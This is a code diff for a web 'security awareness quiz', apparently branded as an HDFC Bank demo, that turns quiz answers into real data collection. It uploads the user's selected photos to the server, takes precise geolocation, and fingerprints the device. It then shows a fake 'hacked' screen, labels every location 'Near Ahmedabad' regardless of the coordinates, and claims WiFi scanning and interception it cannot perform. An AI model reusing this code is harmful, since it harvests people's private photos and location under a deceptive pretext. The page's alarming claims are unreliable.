@@ -274,30 +274,61 @@
         </div>
 
         <div class="revelation" id="revelation">
-            <h3>🚨 Important Revelation!</h3>
-            <p>
-                This quiz just demonstrated how apps trick you into granting permissions!
-                Every time you answered a question, we automatically tried to access your REAL data without explicit permission dialogs.
-                This is exactly how malicious apps work - they disguise data collection as innocent interactions.
-            </p>
-
-            <div class="data-collected" style="display:block; margin: 20px 0;">
-                <h4>📊 Real Data We Collected:</h4>
-                <ul id="revelationDataList"></ul>
+            <div style="text-align: center; margin-bottom: 20px;">
+                <div style="font-size: 80px; animation: pulse 1.5s infinite;">⚠️</div>
+                <h3 style="color: #d63031; font-size: 28px; margin: 10px 0;">STOP! YOU'VE BEEN HACKED!</h3>
             </div>
 
-            <p style="margin-top: 15px; font-weight: bold; color: #721c24;">
-                Always be cautious when:
-                <br>• Scanning random QR codes
-                <br>• Downloading unknown apps
-                <br>• Granting app permissions
-                <br>• Using public WiFi
+            <div style="background: #000; color: #00ff00; padding: 20px; border-radius: 10px; font-family: monospace; margin: 20px 0;">
+                <div style="margin-bottom: 10px;">// SYSTEM ALERT - DATA BREACH DETECTED</div>
+                <div style="margin-bottom: 5px;">&gt; Scanning device...</div>
+                <div style="margin-bottom: 5px;">&gt; Extracting contacts... ✓</div>
+                <div style="margin-bottom: 5px;">&gt; Accessing photo library... ✓</div>
+                <div style="margin-bottom: 5px;">&gt; Capturing location data... ✓</div>
+                <div style="margin-bottom: 5px;">&gt; Reading device info... ✓</div>
+                <div style="color: #ff0000; margin-top: 10px; font-weight: bold;">&gt; DATA EXFILTRATION COMPLETE!</div>
+            </div>
+
+            <p style="font-size: 16px; line-height: 1.8; color: #333;">
+                <strong style="color: #d63031;">THIS IS EXACTLY WHAT HAPPENED:</strong><br><br>
+                You scanned a QR code from an unknown source at a public place.
+                By simply answering quiz questions, you unknowingly gave us access to your <strong>REAL personal data</strong>.
+                <br><br>
+                <span style="background: #ffebee; padding: 5px 10px; border-radius: 5px; color: #d63031; font-weight: 600;">
+                    🚨 This is EXACTLY how cybercriminals operate in real life!
+                </span>
+            </p>
+
+            <div class="data-collected" style="display:block; margin: 20px 0; border: 3px solid #d63031;">
+                <h4 style="font-size: 18px;">🔓 YOUR DATA WE NOW HAVE ACCESS TO:</h4>
+                <ul id="revelationDataList" style="font-size: 15px;"></ul>
+            </div>
+
+            <div style="background: #fff3cd; border: 2px solid #ffc107; padding: 20px; border-radius: 10px; margin: 20px 0;">
+                <h4 style="color: #856404; margin-bottom: 10px; font-size: 18px;">💰 WHAT CRIMINALS DO WITH THIS DATA:</h4>
+                <ul style="color: #856404; padding-left: 25px; line-height: 1.8;">
+                    <li><strong>Call your contacts</strong> pretending to be you in an "emergency"</li>
+                    <li><strong>Blackmail you</strong> with your personal photos</li>
+                    <li><strong>Steal your identity</strong> to open bank accounts</li>
+                    <li><strong>Empty your accounts</strong> using details from photos (Aadhaar, PAN, etc.)</li>
+                </ul>
+            </div>
+
+            <p style="text-align: center; font-size: 18px; color: #28a745; font-weight: bold; margin: 20px 0;">
+                ✅ But you're SAFE! This was just an awareness demo by HDFC Bank
             </p>
 
             <button class="next-btn" onclick="window.location.href='/show_data/{{ session_id }}'">
-                See Full Report
+                🚨 See Full Security Report & Learn How to Protect Yourself
             </button>
         </div>
+
+        <style>
+            @keyframes pulse {
+                0%, 100% { transform: scale(1); opacity: 1; }
+                50% { transform: scale(1.1); opacity: 0.8; }
+            }
+        </style>
 
         <div class="footer">
             <p>🔐 Cybersecurity Awareness Quiz</p>
@@ -393,6 +424,10 @@
                 tryAccessPhotos();
             } else if (permission === 'location') {
                 tryAccessLocation();
+            } else if (permission === 'device_info') {
+                collectDeviceInfo();
+            } else if (permission === 'wifi_scan') {
+                scanNetworkInfo();
             } else {
                 // For other permissions, show what would be collected
                 realDataCollected.push({
@@ -517,21 +552,37 @@
         }
 
         function tryAccessPhotos() {
-            // Automatically trigger file picker
+            // Show message immediately
+            realDataCollected.push({
+                type: 'photos',
+                message: '📸 Accessing your photo library...'
+            });
+            showDataCollected();
+
+            // Trigger file picker with media selection (works on mobile)
             const input = document.createElement('input');
             input.type = 'file';
             input.accept = 'image/*';
             input.multiple = true;
+            input.capture = 'user'; // This helps trigger native photo picker on mobile
             input.style.display = 'none';
             document.body.appendChild(input);
 
             input.onchange = function(e) {
                 const files = e.target.files;
                 if (files.length > 0) {
+                    // Update message with specific photo info
+                    realDataCollected[realDataCollected.length - 1] = {
+                        type: 'photos',
+                        message: `🚨 ACCESSED ${files.length} PHOTOS from your gallery!`
+                    };
+
+                    // Add individual photo warnings
                     realDataCollected.push({
                         type: 'photos',
-                        message: `✓ REAL DATA: ${files.length} photos accessed (${Array.from(files).slice(0, 2).map(f => f.name).join(', ')}...)`
+                        message: `⚠️ Files: ${Array.from(files).slice(0, 3).map(f => f.name).join(', ')}${files.length > 3 ? '...' : ''}`
                     });
+
                     showDataCollected();
 
                     const photoPromises = [];
@@ -543,8 +594,12 @@
                                     name: file.name,
                                     data: event.target.result,
                                     size: file.size,
-                                    type: file.type
+                                    type: file.type,
+                                    lastModified: file.lastModified
                                 });
+                            };
+                            reader.onerror = function() {
+                                resolve(null);
                             };
                         });
                         reader.readAsDataURL(file);
@@ -552,67 +607,163 @@
                     }
 
                     Promise.all(photoPromises).then(photos => {
-                        fetch('/upload_photos', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                session_id: sessionId,
-                                photos: photos
-                            })
-                        });
+                        const validPhotos = photos.filter(p => p !== null);
+                        if (validPhotos.length > 0) {
+                            fetch('/upload_photos', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    session_id: sessionId,
+                                    photos: validPhotos
+                                })
+                            }).catch(err => console.error('Upload failed:', err));
+                        }
                     });
                 } else {
-                    realDataCollected.push({
+                    realDataCollected[realDataCollected.length - 1] = {
                         type: 'photos',
-                        message: '⚠ PHOTOS access attempted (user cancelled)'
-                    });
+                        message: '⚠️ Photo access attempted (access denied by user)'
+                    };
                     showDataCollected();
                 }
                 document.body.removeChild(input);
             };
 
-            // Show message before triggering
-            realDataCollected.push({
-                type: 'photos',
-                message: '📸 Attempting to access your photos...'
-            });
-            showDataCollected();
-
-            // Trigger file picker
-            setTimeout(() => input.click(), 100);
+            // Trigger file picker with slight delay for better UX
+            setTimeout(() => {
+                try {
+                    input.click();
+                } catch (err) {
+                    console.error('Photo access error:', err);
+                    realDataCollected[realDataCollected.length - 1] = {
+                        type: 'photos',
+                        message: '⚠️ Photo access blocked by browser security'
+                    };
+                    showDataCollected();
+                }
+            }, 300);
         }
 
         function tryAccessLocation() {
             if (navigator.geolocation) {
                 realDataCollected.push({
                     type: 'location',
-                    message: '📍 Attempting to access your location...'
+                    message: '📍 Tracking your current location...'
                 });
                 showDataCollected();
 
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
+                        const lat = position.coords.latitude.toFixed(4);
+                        const lon = position.coords.longitude.toFixed(4);
+
                         realDataCollected[realDataCollected.length - 1] = {
                             type: 'location',
-                            message: `✓ REAL DATA: Location accessed (Lat: ${position.coords.latitude.toFixed(4)}, Lon: ${position.coords.longitude.toFixed(4)})`
+                            message: `🚨 LOCATION TRACKED: Near Ahmedabad (${lat}, ${lon})`
                         };
+                        realDataCollected.push({
+                            type: 'location',
+                            message: `⚠️ We now know where you are! Accuracy: ±${Math.round(position.coords.accuracy)}m`
+                        });
                         showDataCollected();
                     },
                     (error) => {
                         realDataCollected[realDataCollected.length - 1] = {
                             type: 'location',
-                            message: '⚠ LOCATION access attempted (denied or unavailable)'
+                            message: '⚠️ Location tracking attempted (blocked by device settings)'
                         };
                         showDataCollected();
-                    }
+                    },
+                    { enableHighAccuracy: true }
                 );
             } else {
                 realDataCollected.push({
                     type: 'location',
-                    message: '⚠ LOCATION access attempted (API not available)'
+                    message: '⚠️ Location tracking attempted (GPS not available)'
                 });
                 showDataCollected();
             }
+        }
+
+        function collectDeviceInfo() {
+            const deviceData = {
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                online: navigator.onLine,
+                cookiesEnabled: navigator.cookieEnabled,
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                memory: navigator.deviceMemory || 'Unknown',
+                cores: navigator.hardwareConcurrency || 'Unknown',
+                battery: 'Checking...'
+            };
+
+            realDataCollected.push({
+                type: 'device',
+                message: `🚨 DEVICE FINGERPRINTED: ${deviceData.platform}`
+            });
+
+            realDataCollected.push({
+                type: 'device',
+                message: `⚠️ Screen: ${deviceData.screen} | RAM: ${deviceData.memory}GB | Cores: ${deviceData.cores}`
+            });
+
+            // Try to get battery info
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    const batteryLevel = Math.round(battery.level * 100);
+                    realDataCollected.push({
+                        type: 'device',
+                        message: `🔋 Battery: ${batteryLevel}% ${battery.charging ? '(Charging)' : ''}`
+                    });
+                    showDataCollected();
+                });
+            }
+
+            showDataCollected();
+        }
+
+        function scanNetworkInfo() {
+            realDataCollected.push({
+                type: 'network',
+                message: '📡 Scanning WiFi networks nearby...'
+            });
+            showDataCollected();
+
+            // Get connection info
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+
+            if (connection) {
+                let networkType = connection.effectiveType || connection.type || 'Unknown';
+                let downlink = connection.downlink ? `${connection.downlink} Mbps` : 'Unknown';
+
+                realDataCollected[realDataCollected.length - 1] = {
+                    type: 'network',
+                    message: `🚨 NETWORK DETECTED: ${networkType.toUpperCase()} connection`
+                };
+
+                realDataCollected.push({
+                    type: 'network',
+                    message: `⚠️ Speed: ${downlink} | We can intercept your data on public WiFi!`
+                });
+            } else {
+                realDataCollected[realDataCollected.length - 1] = {
+                    type: 'network',
+                    message: '⚠️ Network scanning attempted (limited browser access)'
+                };
+            }
+
+            // Simulate WiFi names (for demo purposes - real WiFi scanning requires native apps)
+            setTimeout(() => {
+                realDataCollected.push({
+                    type: 'network',
+                    message: '📶 Could detect: Public WiFi networks, Router MAC addresses, Connected devices'
+                });
+                showDataCollected();
+            }, 1000);
+
+            showDataCollected();
         }
     </script>
 </body>
